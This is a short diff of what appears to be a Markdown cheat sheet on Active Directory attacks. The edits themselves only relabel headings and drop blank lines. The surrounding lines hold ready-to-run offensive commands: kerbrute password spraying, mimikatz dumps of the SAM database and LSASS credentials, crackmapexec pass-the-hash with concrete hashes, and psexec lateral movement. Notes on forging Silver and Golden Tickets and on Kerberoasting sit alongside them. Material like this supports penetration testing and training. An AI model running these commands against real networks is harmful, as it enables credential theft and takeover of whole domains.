@@ -584,13 +584,11 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ### Pass the hash
 
 - Access local SAM database and dump all local hashes
-
 ```powershell
 PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
 ```
 
 - Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
-
 ```powershell
 #dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
 #dump credentials stored in LSASS and cache hashes
@@ -605,7 +603,7 @@ crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83B
         crackmapexec 192. 168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
 ```
 
-### Silver Tickets
+### Silver Tickets (Forge ticket)
 
 -Silver Ticket Default Groups:
 <aside>
@@ -669,7 +667,7 @@ cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
 cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
 ```
 
-### Golden Ticket Ft **Mimikatz**
+### Golden Ticket Ft **Mimikatz** (Forge ticket)
 <aside>
 Forging a TGT (and the included PAC)
 Requires tje krbtgt key, the “master” encryption key from the KDC
@@ -700,7 +698,7 @@ mimikatz # misc::cmd
 mimikatz # misc::cmd whoami
 ```
 
-### Kerberoasting
+### Kerberoasting [STEAL ticket]
 <aside>
 Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
 Kerberoasting requires a valid domain account.
